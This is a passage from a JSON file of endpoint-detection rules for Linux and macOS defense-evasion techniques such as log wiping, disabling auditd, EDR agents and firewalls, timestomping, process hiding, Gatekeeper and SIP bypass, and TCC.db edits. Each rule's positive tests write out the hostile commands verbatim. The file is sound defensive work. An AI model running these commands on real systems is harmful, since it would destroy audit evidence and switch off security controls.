+   "technique_name": "Indicator Removal: Clear Linux or Mac System Logs",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(truncate\\s+-s\\s*0|shred\\b[^|;]*|cat\\s+/dev/null\\s*>|:\\s*>|>)\\s*/var/log/(auth\\.log|secure|syslog|messages|wtmp|btmp|lastlog|audit/audit\\.log|kern\\.log|faillog)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bfind\\s+/var/log\\b.*-exec\\s+(truncate\\s+-s\\s*0|shred)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "logs",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/truncate",
+      "command": "truncate -s 0 /var/log/auth.log"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c > /var/log/wtmp"
+     },
+     {
+      "executable": "/usr/bin/shred",
+      "command": "shred -zu /var/log/secure"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/tail",
+      "command": "tail -f /var/log/auth.log"
+     },
+     {
+      "executable": "/usr/bin/logrotate",
+      "command": "logrotate /etc/logrotate.conf"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-log-sed-scrub",
+   "name": "Log lines removed in place with sed",
+   "description": "sed -i deleting lines (an IP or user) from a /var/log file.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.002",
+   "technique_name": "Indicator Removal: Clear Linux or Mac System Logs",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "sed\\s+(-\\w+\\s+)*-i\\S*\\s+['\\\"]?/[^/]+/d['\\\"]?\\s+/var/log/"
+   },
+   "tags": [
+    "logs",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/sed",
+      "command": "sed -i /203.0.113.4/d /var/log/auth.log"
+     },
+     {
+      "executable": "/usr/bin/sed",
+      "command": "sed -i /ann/d /var/log/secure"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/sed",
+      "command": "sed -n /error/p /var/log/syslog"
+     },
+     {
+      "executable": "/usr/bin/sed",
+      "command": "sed -i s/foo/bar/ /etc/app.conf"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-journal-vacuum-aggressive",
+   "name": "journald logs vacuumed to near zero",
+   "description": "journalctl --vacuum-time=1s or --vacuum-size=1K removing the journal history.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.002",
+   "technique_name": "Indicator Removal: Clear Linux or Mac System Logs",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "journalctl\\b.*--vacuum-(time=\\d+(s|m)\\b|size=\\d{1,6}[KB]?\\b|files=[01]\\b)"
+   },
+   "tags": [
+    "logs",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/journalctl",
+      "command": "journalctl --rotate --vacuum-time=1s"
+     },
+     {
+      "executable": "/usr/bin/journalctl",
+      "command": "journalctl --vacuum-size=1K"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/journalctl",
+      "command": "journalctl --vacuum-time=2weeks"
+     },
+     {
+      "executable": "/usr/bin/journalctl",
+      "command": "journalctl --vacuum-size=500M"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-rm-var-log-bulk",
+   "name": "Bulk deletion of /var/log content",
+   "description": "rm -rf over /var/log, /var/log/*, or key log files.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.002",
+   "technique_name": "Indicator Removal: Clear Linux or Mac System Logs",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "\\brm\\s+(-\\w+\\s+)*(/private)?/var/log(/\\*|/audit(/\\S*)?|/(wtmp|btmp|lastlog|auth\\.log|secure|syslog|system\\.log)\\b|/?\\s*$)"
+   },
+   "tags": [
+    "logs",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/rm",
+      "command": "rm -rf /var/log/*"
+     },
+     {
+      "executable": "/bin/rm",
+      "command": "rm -f /var/log/wtmp /var/log/btmp"
+     },
+     {
+      "executable": "/bin/rm",
+      "command": "rm -rf /private/var/log/system.log"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/rm",
+      "command": "rm -f /var/log/myapp/old.log.3"
+     },
+     {
+      "executable": "/bin/rm",
+      "command": "rm -rf /var/log/nginx/access.log.4.gz"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-log-erase",
+   "name": "macOS unified log erased",
+   "description": "log erase --all or deleting diagnostics/asl directories.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.002",
+   "technique_name": "Indicator Removal: Clear Linux or Mac System Logs",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "\\blog\\s+erase\\s+(--all|--ttl)|rm\\s+(-\\w+\\s+)*/(private/)?var/db/(diagnostics|uuidtext)|rm\\s+(-\\w+\\s+)*/(private/)?var/log/asl"
+   },
+   "tags": [
+    "logs",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/log",
+      "command": "log erase --all"
+     },
+     {
+      "executable": "/bin/rm",
+      "command": "rm -rf /private/var/db/diagnostics"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/log",
+      "command": "log show --last 1h"
+     },
+     {
+      "executable": "/usr/bin/log",
+      "command": "log stream --predicate process == \"sshd\""
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-auditd-disable",
+   "name": "Linux audit framework disabled or rules flushed",
+   "description": "auditctl -e 0, -D, or stopping/disabling/masking auditd.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.012",
+   "technique_name": "Impair Defenses: Disable or Modify Linux Audit System",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bauditctl\\b.*(-e\\s*[02]\\b|-D\\b|-a\\s+never,)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(systemctl|service)\\b.*\\b(stop|disable|mask)\\b.*\\bauditd\\b|\\bservice\\s+auditd\\s+stop\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bkill(all)?\\b.*auditd"
+     }
+    ]
+   },
+   "tags": [
+    "auditd",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/sbin/auditctl",
+      "command": "auditctl -e 0"
+     },
+     {
+      "executable": "/sbin/auditctl",
+      "command": "auditctl -D"
+     },
+     {
+      "executable": "/usr/bin/systemctl",
+      "command": "systemctl mask auditd"
+     },
+     {
+      "executable": "/sbin/service",
+      "command": "service auditd stop"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/sbin/auditctl",
+      "command": "auditctl -l"
+     },
+     {
+      "executable": "/sbin/auditctl",
+      "command": "auditctl -s"
+     },
+     {
+      "executable": "/sbin/auditctl",
+      "command": "auditctl -a always,exit -F arch=b64 -S execve"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-auditd-rules-file-edit",
+   "name": "Audit rules file modified",
+   "description": "File event on /etc/audit/audit.rules or rules.d, which could remove detection rules.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.012",
+   "technique_name": "Impair Defenses: Disable or Modify Linux Audit System",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "field": "path",
+    "op": "regex",
+    "pattern": "^/etc/(audit/auditd\\.conf|audit/audit\\.rules|audit/rules\\.d/[^/]+\\.rules)$"
+   },
+   "tags": [
+    "auditd",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/etc/audit/rules.d/audit.rules",
+      "operation": "modify"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/etc/audit/plugins.d/syslog.conf",
+      "operation": "modify"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-security-agent-stop",
+   "name": "Logging or EDR agent stopped",
+   "description": "systemctl/service stop, disable or mask of rsyslog, syslog-ng, or well-known security agents.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "technique_name": "Impair Defenses: Disable or Modify Tools",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(systemctl|service)\\b.*\\b(stop|disable|mask)\\b.*\\b(rsyslog(d)?|syslog-ng|falcon-sensor|falcond|wazuh-agent|ossec|osqueryd|elastic-agent|filebeat|auditbeat|cbdaemon|sentinelone|sysmon|kavach\\S*)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bservice\\s+(rsyslog(d)?|syslog-ng|falcon-sensor|wazuh-agent|ossec|osqueryd|elastic-agent|auditbeat|kavach\\S*)\\s+stop\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bfalconctl\\s+(-\\w+\\s+)*-d\\b|\\bsentinelctl\\s+(unload|uninstall|disable)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "agent-tamper",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/systemctl",
+      "command": "systemctl stop falcon-sensor"
+     },
+     {
+      "executable": "/usr/bin/systemctl",
+      "command": "systemctl disable --now wazuh-agent"
+     },
+     {
+      "executable": "/sbin/service",
+      "command": "service rsyslog stop"
+     },
+     {
+      "executable": "/opt/CrowdStrike/falconctl",
+      "command": "falconctl -d -f"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/systemctl",
+      "command": "systemctl restart rsyslog"
+     },
+     {
+      "executable": "/usr/bin/systemctl",
+      "command": "systemctl status falcon-sensor"
+     },
+     {
+      "executable": "/opt/CrowdStrike/falconctl",
+      "command": "falconctl -g --cid"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-selinux-apparmor-off",
+   "name": "SELinux or AppArmor enforcement turned off",
+   "description": "setenforce 0, SELINUX=disabled edits, aa-teardown, or stopping apparmor.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "technique_name": "Impair Defenses: Disable or Modify Tools",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bsetenforce\\s+(0|permissive)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "SELINUX=(disabled|permissive)\\b.*/etc/(sysconfig/)?selinux(/config)?|/etc/selinux/config\\b.*SELINUX=disabled"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\baa-teardown\\b|\\b(systemctl|service)\\b.*\\b(stop|disable|mask)\\b.*\\bapparmor\\b"
+     }
+    ]
+   },
+   "tags": [
+    "lsm",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/setenforce",
+      "command": "setenforce 0"
+     },
+     {
+      "executable": "/usr/sbin/aa-teardown",
+      "command": "aa-teardown"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c sed -i s/SELINUX=enforcing/SELINUX=disabled/ /etc/selinux/config"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/setenforce",
+      "command": "setenforce 1"
+     },
+     {
+      "executable": "/usr/sbin/getenforce",
+      "command": "getenforce"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-firewall-flush",
+   "name": "Host firewall disabled or flushed",
+   "description": "iptables policy ACCEPT, ufw disable, stopping firewalld, or nft flush ruleset.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.004",
+   "technique_name": "Impair Defenses: Disable or Modify System Firewall",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\biptables\\b.*-P\\s+(INPUT|FORWARD|OUTPUT)\\s+ACCEPT"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bufw\\s+(--force\\s+)?disable\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(systemctl|service)\\b.*\\b(stop|disable|mask)\\b.*\\bfirewalld\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bnft\\s+flush\\s+ruleset\\b"
+     }
+    ]
+   },
+   "tags": [
+    "firewall",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/sbin/iptables",
+      "command": "iptables -P INPUT ACCEPT"
+     },
+     {
+      "executable": "/usr/sbin/ufw",
+      "command": "ufw disable"
+     },
+     {
+      "executable": "/usr/bin/systemctl",
+      "command": "systemctl stop firewalld"
+     },
+     {
+      "executable": "/usr/sbin/nft",
+      "command": "nft flush ruleset"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/sbin/iptables",
+      "command": "iptables -L -n"
+     },
+     {
+      "executable": "/usr/sbin/ufw",
+      "command": "ufw allow 443/tcp"
+     },
+     {
+      "executable": "/usr/bin/systemctl",
+      "command": "systemctl restart firewalld"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-hidden-dir-tmp-mkdir",
+   "name": "Hidden directory created under a temp path",
+   "description": "mkdir of a dot-prefixed directory (or '...') beneath /tmp, /var/tmp or /dev/shm.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564.001",
+   "technique_name": "Hide Artifacts: Hidden Files and Directories",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "\\bmkdir\\s+(-\\w+\\s+)*/(tmp|var/tmp|dev/shm)/(\\.{1,3}[a-zA-Z0-9_-]*|\\.\\s)(\\s|/|$)"
+   },
+   "tags": [
+    "hidden",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/mkdir",
+      "command": "mkdir -p /dev/shm/.X11-cache"
+     },
+     {
+      "executable": "/bin/mkdir",
+      "command": "mkdir /tmp/... "
+     },
+     {
+      "executable": "/bin/mkdir",
+      "command": "mkdir /var/tmp/.k"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/mkdir",
+      "command": "mkdir -p /tmp/build-12345"
+     },
+     {
+      "executable": "/bin/mkdir",
+      "command": "mkdir /dev/shm/app-cache"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-exec-from-hidden-tmp-dir",
+   "name": "Binary executed from a hidden directory under a temp path",
+   "description": "The executable lives in /tmp, /var/tmp or /dev/shm inside a dot-prefixed directory.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564.001",
+   "technique_name": "Hide Artifacts: Hidden Files and Directories",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "executable",
+    "op": "regex",
+    "pattern": "^/(tmp|var/tmp|dev/shm)/\\.[^/]+/[^/]+$"
+   },
+   "tags": [
+    "hidden",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/dev/shm/.k/kdevtmpfsi",
+      "command": "./kdevtmpfsi"
+     },
+     {
+      "executable": "/tmp/.ICEd/sshd",
+      "command": "./sshd -D"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/tmp/build/a.out",
+      "command": "./a.out"
+     },
+     {
+      "executable": "/tmp/go-build123/b001/exe/main",
+      "command": "main"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-timestomp-touch",
+   "name": "File timestamps forged with touch",
+   "description": "touch -t with an explicit past date, -d '... ago', or -r pointing at a system binary.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.006",
+   "technique_name": "Indicator Removal: Timestomp",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/touch"
+     },
+     {
+      "any": [
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "-\\w*[at]\\w*\\s+(-\\w+\\s+)*\\d{8,12}(\\.\\d\\d)?(\\s|$)"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "-d\\s*['\\\"]?\\d+\\s+(year|month|day)s?\\s+ago"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "-r\\s*/(bin|usr|sbin|lib|etc)/"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "timestomp",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/touch",
+      "command": "touch -t 201501021200 /var/tmp/.k"
+     },
+     {
+      "executable": "/usr/bin/touch",
+      "command": "touch -r /bin/ls /tmp/.implant"
+     },
+     {
+      "executable": "/usr/bin/touch",
+      "command": "touch -d 3 years ago /usr/lib/x.so"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/touch",
+      "command": "touch notes.txt"
+     },
+     {
+      "executable": "/usr/bin/touch",
+      "command": "touch -c build/out.stamp"
+     },
+     {
+      "executable": "/usr/bin/touch",
+      "command": "touch -d @1700000000 dist/app.tar"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-setfile-timestomp",
+   "name": "macOS SetFile used to alter creation date",
+   "description": "SetFile -d or -m forging file dates.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.006",
+   "technique_name": "Indicator Removal: Timestomp",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/SetFile"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-[dm]\\s+['\\\"]?\\d"
+     }
+    ]
+   },
+   "tags": [
+    "timestomp",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/SetFile",
+      "command": "SetFile -d 01/02/2015 12:00:00 /Users/Shared/.x"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/SetFile",
+      "command": "SetFile -a V /Users/ann/Pictures"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-chattr-immutable-persistence",
+   "name": "Immutable attribute set on persistence or auth file",
+   "description": "chattr +i on authorized_keys, rc.local, crontab, ld.so.preload or shadow so cleanup fails.",
+   "tactic": "Defense Evasion",
+   "technique": "T1222.002",
+   "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/chattr"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\+[a-zA-Z]*[ia]\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "authorized_keys|rc\\.local|/cron|ld\\.so\\.preload|/etc/shadow|/etc/passwd|/etc/sudoers"
+     }
+    ]
+   },
+   "tags": [
+    "chattr",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/chattr",
+      "command": "chattr +i /root/.ssh/authorized_keys"
+     },
+     {
+      "executable": "/usr/bin/chattr",
+      "command": "chattr +ia /etc/cron.d/sysupd"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/chattr",
+      "command": "chattr +i /srv/data/readonly.db"
+     },
+     {
+      "executable": "/usr/bin/lsattr",
+      "command": "lsattr /root/.ssh/authorized_keys"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-exec-a-kernel-thread-name",
+   "name": "Process renamed to look like a kernel thread",
+   "description": "bash exec -a [kworker/..] or similar to mimic kernel threads in ps output.",
+   "tactic": "Defense Evasion",
+   "technique": "T1036.004",
+   "technique_name": "Masquerading: Masquerade Task or Service",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "exec\\s+-a\\s*['\\\"]?\\[?(kworker|kthreadd|ksoftirqd|migration|rcu_|watchdog|kdevtmpfs|jbd2)"
+   },
+   "tags": [
+    "masquerade",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c exec -a [kworker/0:1] /tmp/.x"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c exec -a 'kthreadd' ./miner"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c exec -a myapp-worker /usr/bin/node app.js"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-bind-mount-over-proc-pid",
+   "name": "Bind mount over /proc/<pid> to hide a process",
+   "description": "mount --bind of an empty directory over /proc/<pid>, which hides the process from ps and /proc walkers.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564",
+   "technique_name": "Hide Artifacts",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "\\bmount\\s+(-\\w+\\s+)*(--bind|-o\\s+bind)\\s+\\S+\\s+/proc/\\d+"
+   },
+   "tags": [
+    "hidden",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/mount",
+      "command": "mount --bind /tmp/empty /proc/4312"
+     },
+     {
+      "executable": "/bin/mount",
+      "command": "mount -o bind /dev/shm/.e /proc/881"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/mount",
+      "command": "mount --bind /data /srv/data"
+     },
+     {
+      "executable": "/bin/mount",
+      "command": "mount -t proc proc /proc"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-quarantine-strip",
+   "name": "Quarantine attribute stripped from a download",
+   "description": "xattr -d/-cr com.apple.quarantine on a file under Downloads, /tmp or /Users/Shared, which bypasses Gatekeeper first-run checks.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553.001",
+   "technique_name": "Subvert Trust Controls: Gatekeeper Bypass",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/xattr"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-\\w*d\\w*\\s+com\\.apple\\.quarantine|-\\w*c\\w*r?\\w*\\s)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/Downloads/|/private/tmp/|\\s/tmp/|/Users/Shared/|/Volumes/)"
+     }
+    ]
+   },
+   "tags": [
+    "gatekeeper",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/xattr",
+      "command": "xattr -cr /Users/ann/Downloads/Installer.app"
+     },
+     {
+      "executable": "/usr/bin/xattr",
+      "command": "xattr -d com.apple.quarantine /tmp/payload"
+     },
+     {
+      "executable": "/usr/bin/xattr",
+      "command": "xattr -dr com.apple.quarantine /Users/Shared/update.app"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/xattr",
+      "command": "xattr -dr com.apple.quarantine /Applications/Docker.app"
+     },
+     {
+      "executable": "/usr/bin/xattr",
+      "command": "xattr -l /Users/ann/Downloads/report.pdf"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-gatekeeper-sip-disable",
+   "name": "Gatekeeper or SIP disabled",
+   "description": "spctl --master-disable, csrutil disable, or LSQuarantine turned off.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553.001",
+   "technique_name": "Subvert Trust Controls: Gatekeeper Bypass",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "\\bspctl\\s+(--master-disable|--global-disable)|\\bcsrutil\\s+disable|LSQuarantine\\s+-bool\\s+(NO|false)"
+   },
+   "tags": [
+    "gatekeeper",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/spctl",
+      "command": "spctl --master-disable"
+     },
+     {
+      "executable": "/usr/bin/csrutil",
+      "command": "csrutil disable"
+     },
+     {
+      "executable": "/usr/bin/defaults",
+      "command": "defaults write com.apple.LaunchServices LSQuarantine -bool NO"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/spctl",
+      "command": "spctl --assess -v /Applications/Safari.app"
+     },
+     {
+      "executable": "/usr/bin/csrutil",
+      "command": "csrutil status"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-tcc-db-edit",
+   "name": "TCC privacy database edited directly",
+   "description": "sqlite3 writing to TCC.db to grant Accessibility, ScreenCapture or Full Disk Access without a prompt.",
+   "tactic": "Defense Evasion",
+   "technique": "T1548.006",
+   "technique_name": "Abuse Elevation Control Mechanism: TCC Manipulation",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/sqlite3"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "TCC\\.db"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(insert|replace|update|delete)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "tcc",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/sqlite3",
+      "command": "sqlite3 /Library/Application Support/com.apple.TCC/TCC.db INSERT or REPLACE INTO access VALUES('kTCCServiceAccessibility','com.evil.app',0,2,4,1)"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/sqlite3",
+      "command": "sqlite3 /Library/Application Support/com.apple.TCC/TCC.db select service,client from access"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-tcc-file-modify",
+   "name": "TCC database file modified",
+   "description": "File event writing TCC.db, normally owned by tccd.",
+   "tactic": "Defense Evasion",
+   "technique": "T1548.006",
+   "technique_name": "Abuse Elevation Control Mechanism: TCC Manipulation",
+   "severity": "low",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "field": "path",
+    "op": "regex",
+    "pattern": "/com\\.apple\\.TCC/TCC\\.db$"
+   },
+   "tags": [
+    "tcc",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Library/Application Support/com.apple.TCC/TCC.db",
+      "operation": "modify"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Library/Application Support/com.apple.TCC/TCC.db-journal.txt",
+      "operation": "modify"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-add-trusted-cert",
+   "name": "Root certificate added to the system trust store",
+   "description": "security add-trusted-cert -d -r trustRoot, enabling TLS interception.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553.004",
+   "technique_name": "Subvert Trust Controls: Install Root Certificate",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "security\\b.*add-trusted-cert\\b.*-r\\s+trustRoot"
+   },
+   "tags": [
+    "cert",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/security",
+      "command": "security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/ca.pem"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/security",
+      "command": "security verify-cert -c /tmp/ca.pem"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-profiles-install",
+   "name": "Configuration profile installed from the command line",
+   "description": "profiles install -type=configuration, a vehicle for root certs, proxies or PPPC grants.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553",
+   "technique_name": "Subvert Trust Controls",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/profiles"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\binstall\\b.*-(path|type)"
+     }
+    ]
+   },
+   "tags": [
+    "profiles",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/profiles",
+      "command": "profiles install -type=configuration -path /tmp/x.mobileconfig"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/profiles",
+      "command": "profiles list"
+     },
+     {
+      "executable": "/usr/bin/profiles",
+      "command": "profiles status -type enrollment"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-firewall-off",
+   "name": "macOS application firewall or pf disabled",
+   "description": "socketfilterfw --setglobalstate off or pfctl -d.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.004",
+   "technique_name": "Impair Defenses: Disable or Modify System Firewall",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "socketfilterfw\\b.*--setglobalstate\\s+off|\\bpfctl\\s+-d\\b"
+   },
+   "tags": [
+    "firewall",
+    "unix2"
+   ],
